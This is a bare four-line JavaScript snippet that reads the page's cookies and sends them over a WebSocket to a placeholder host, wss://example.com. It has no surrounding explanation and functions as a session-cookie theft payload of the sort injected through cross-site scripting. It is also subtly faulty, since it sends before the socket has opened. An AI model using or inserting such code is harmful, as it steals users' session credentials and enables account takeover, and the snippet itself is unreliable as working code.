const cookieData = document.cookie;

const socket = new WebSocket("wss://example.com/socket");

socket.send(cookieData);
